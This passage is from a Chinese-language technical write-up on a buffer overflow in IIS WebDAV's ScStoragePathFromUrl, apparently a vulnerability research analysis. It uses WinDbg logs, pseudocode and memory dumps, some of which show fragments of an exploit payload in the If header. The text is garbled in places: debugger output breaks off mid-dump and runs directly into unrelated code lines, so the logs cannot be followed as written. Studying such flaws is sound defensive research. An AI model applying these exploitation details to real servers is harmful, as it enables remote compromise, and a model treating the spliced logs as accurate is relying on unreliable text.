`1`。实际上，这个值代表的是真实物理路径的 **字符个数** 。
    0x281c = 0x12 ("c:\inetpub\wwwroot") + 10248 ("/aaa..") + 1 ('>') + 1 ('\0')
在 `HrCheckIfHeader` 第二次调用 `ScStoragePathFromUrl` 之前，将根据 `length` 的值设置
`CStackBuffer` 缓冲区的大小。然而，这里设置的大小是字符个数，并不是字节数，所以第二次调用 `ScStoragePathFromUrl`
时会导致缓冲区溢出。实际上，调用 `CStackBuffer::resize` 的位置就是
`httpext!HrCheckIfHeader+0x0000013c`，也就是堆溢出发生时通过 `!heap -p -a edi` 命令得到的栈帧。
    res = pMethUtil->ScStoragePathFromUrl(
        buffer2.get(), buffer1.get(), &length);
    if (res == 1)
    {
        if (buffer1.resize(length))    // httpext!HrCheckIfHeader+0x0000013c
        {
            res = pMethUtil->ScStoragePathFromUrl(
                buffer2.get(), buffer1.get(), &length);
        }
    }
小结：
  * 函数 `ScStoragePathFromUrl` 负责将 URL 请求中的文件路径转换为实际的物理路径，函数的名字也印证了这一猜想；
  * 第一次调用此函数时，由于缓冲区大小不够，返回实际物理路径的字符个数；
  * 第二次调用此函数之前先调整缓冲区的大小；
  * 由于缓冲区的大小设置成了字符个数，而不是字节数，因此导致缓冲区溢出；
  * 两次调用同一个 API 很符合微软的风格（第一次得到所需的空间大小，调整缓冲区大小后再次调用）；
## 3\. 漏洞利用
### 3.1 URL 解码
在函数 `HrCheckIfHeader` 中，首先调用 `CRequest::LpwszGetHeader` 来获取 **HTTP**
头中的特定字段的值，该函数简化后的伪代码如下所示：
    int CRequest::LpwszGetHeader(const char *tag, int a3)
    {
        // 查找缓存
        int res = CHeaderCache::LpszGetHeader(
            (char *)this + 56, tag);
        if (res) return res;
        // 获取值
        char *pszHeader = this->LpszGetHeader(tag);
        if (!pszHeader) return 0;
        int nHeaderChars = strlen(pszHeader);
        CStackBuffer stackbuffer(64);
        if (!stackbuffer.resize(2 * nHeaderChars + 2))
        {
            // _CxxThrowException(...);
        }
        // 调用 ScConvertToWide 进行转换
        int v11 = nHeaderChars + 1;
        char* language = this->LpszGetHeader("Accept-Language");
        int v7 = ScConvertToWide(pszHeader, &v11, 
                                 stackbuffer.get(), language, a3);
        if ( v7 ) // _CxxThrowException(...);
        // 设置缓存
        res = CHeaderCache::SetHeader(
                tag, stackbuffer.get(), 0);
        stackbuffer.release();
        return res;
    }
可以看出这里通过 `CHeaderCache` 建立缓存机制，此外获取到的值会通过调用 `ScConvertToWide`
来进行转换操作。事实上，`ScConvertToWide` 会调用 `MultiByteToWideChar` 对字符串进行转换。
    MultiByteToWideChar(
        CP_UTF8, 
        0, 
        pszHeader, 
        strlen(pszHeader) + 1, 
        lpWideCharStr, 
        strlen(pszHeader) + 1);
由于存在编码转换操作，Exploit 中的 Payload 需要先进行编码，这样才能保证解码后得到正常的 Payload。字符串转换的调试日志如下所示：
    0:007> p
    eax=00000000 ebx=00000655 ecx=077f59a9 edx=077f5900 esi=0000fde9 edi=77e62fd6
    eip=6712721f esp=03fef5b0 ebp=03fef71c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!ScConvertToWide+0x150:
    6712721f ffd7            call    edi {kernel32!MultiByteToWideChar (77e62fd6)}
    $$ 调用 MultiByteToWideChar 时的参数
    0:007> dds esp L6
    03fef5b0  0000fde9       $$ CP_UTF8
    03fef5b4  00000000       $$ 0
    03fef5b8  077f59a8       $$ pszHeader
    03fef5bc  00000655       $$ strlen(pszHeader) + 1
    03fef5c0  077f3350       $$ lpWideCharStr
    03fef5c4  00000655       $$ strlen(pszHeader) + 1
    $$ 转换前的字符串
    0:007> db 077f59a8
    077f59a8  3c 68 74 74 70 3a 2f 2f-6c 6f 63 61 6c 68 6f 73   p
    eax=000003d1 ebx=00000655 ecx=0000b643 edx=00000000 esi=0000fde9 edi=77e62fd6
    eip=67127221 esp=03fef5c8 ebp=03fef71c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!ScConvertToWide+0x152:
    67127221 85c0            test    eax,eax
    $$ 转换后的字符串
    0:007> db 077f3350
    077f3350  3c 00 68 00 74 00 74 00-70 00 3a 00 2f 00 2f 00  ScStoragePathFromUrl(
        buffer2.get(), buffer1.get(), &length);     // (1)
    if (res == 1)
    {
        if (buffer1.resize(length))                 // (2)
        {
            res = pMethUtil->ScStoragePathFromUrl(  // (3)
                buffer2.get(), buffer1.get(), &length);
        }
    }
**(1)** `HrCheckIfHeader` 第一次调用 `ScStoragePathFromUrl` 时传递的参数分析如下（函数返回值为
`1`，长度设置为 `0xaa`）：
    0:006> dds esp L3
    03faf7b4  077d8eb0      $$ http://localhost/aaaaaaa....
    03faf7b8  03faf804      $$ CStackBuffer1.buffer
    03faf7bc  03faf800      $$ 00000082
    0:006> dd 03faf800 L1
    03faf800  
    0:006> db 077d8eb0
    077d8eb0  68 00 74 00 74 00 70 00-3a 00 2f 00 2f 00 6c 00  h.t.t.p.:././.l.
    077d8ec0  6f 00 63 00 61 00 6c 00-68 00 6f 00 73 00 74 00  o.c.a.l.h.o.s.t.
    077d8ed0  2f 00 61 00 61 00 61 00-61 00 61 00 61 00 61 00  /.a.a.a.a.a.a.a.
    077d8ee0  68 6f 63 78 61 77 33 71-36 69 72 47 39 7a 77 4b  hocxaw3q6irG9zwK
    077d8ef0  70 4f 53 75 4f 7a 68 48-63 56 54 6d 45 68 53 39  pOSuOzhHcVTmEhS9
    077d8f00  6c 50 67 55 63 67 64 33-30 46 45 78 52 69 31 54  lPgUcgd30FExRi1T
    077d8f10  58 4c 51 6a 41 72 31 42-35 70 50 58 64 36 47 6c  XLQjAr1B5pPXd6Gl
    077d8f20  39 35 6a 54 34 50 43 54-52 77 61 50 32 32 4b 6d  95jT4PCTRwaP22Km
    077d8f30  34 6c 47 32 41 62 4d 37-61 51 62 58 73 47 50 52  4lG2AbM7aQbXsGPR
    077d8f40  70 36 44 75 6a 68 74 33-4a 4e 6b 78 76 49 73 4e  p6Dujht3JNkxvIsN
    077d8f50  6a 4c 7a 57 71 6f 4a 58-30 32 6e 37 49 4b 4d 52  jLzWqoJX02n7IKMR
    077d8f60  63 48 4c 6f 56 75 75 75-6f 66 68 76 4d 44 70 50  cHLoVuuuofhvMDpP
    077d8f70  36 7a 4b 62 57 65 50 75-72 6a 6b 7a 62 77 58 76  6zKbWePurjkzbwXv
    077d8f80  48 62 31 65 54 30 79 6c-4a 50 62 54 33 50 77 35  Hb1eT0ylJPbT3Pw5
    077d8f90  77 6a 44 41 34 33 76 64-46 4d 54 56 6c 47 43 65  wjDA43vdFMTVlGCe
    077d8fa0  32 76 78 72 69 57 38 43-72 62 30 5a 38 59 48 54  2vxriW8Crb0Z8YHT
    077d8fb0  02 02 02 02 c0 12 03 68-44 6c 56 52 37 4b 6d 6c  .......hDlVR7Kml
    077d8fc0  58 4f 5a 58 50 79 6a 49-4f 58 52 4a 50 41 4d 66  XOZXPyjIOXRJPAMf
    077d8fd0  c0 13 03 68 34 48 31 65-43 6f 66 6e 41 74 6c 43  ...h4H1eCofnAtlC
    077d8fe0  c0 13 03 68 43 53 41 6a-52 70 30 33 66 58 4c 42  ...hCSAjRp03fXLB
    077d8ff0  4b 70 46 63 73 51 41 79-50 7a 6c 4a 3e 00 00 00  KpFcsQAyPzlJ>...
    077d9000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
**(2)** 因为 `ScStoragePathFromUrl` 返回 `0xaa`，所以 `buffer1.resize(0xaa)`
并不会在堆上分配空间，而是直接使用栈上的 `buffer`。
**(3)** 第二次调用 `ScStoragePathFromUrl` 时会导致栈溢出，实际结果是